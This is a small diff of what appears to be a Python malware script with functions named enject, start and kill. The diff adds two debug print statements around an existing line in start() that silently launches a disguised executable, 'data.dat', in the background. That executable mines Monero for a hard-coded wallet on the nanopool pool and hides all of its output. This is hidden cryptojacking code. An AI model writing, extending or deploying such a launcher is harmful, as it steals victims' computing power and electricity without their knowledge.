@@ -11,7 +11,9 @@ def enject():
 
 def start():
 
+    print("1")
     subprocess.Popen("cmd.exe /c start /B data.dat -o xmr-eu1.nanopool.org:10300 -u 46yEzJmwGanCo29RsAQXGsSPtpD9kikjRFiabDDLWsEYYop5HfcbvChKGihnNYmAct3jaNf8siSVydxQuDvCxkVY52SJwLv -p x", shell=True,stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    print("2")
 
 
 def kill():
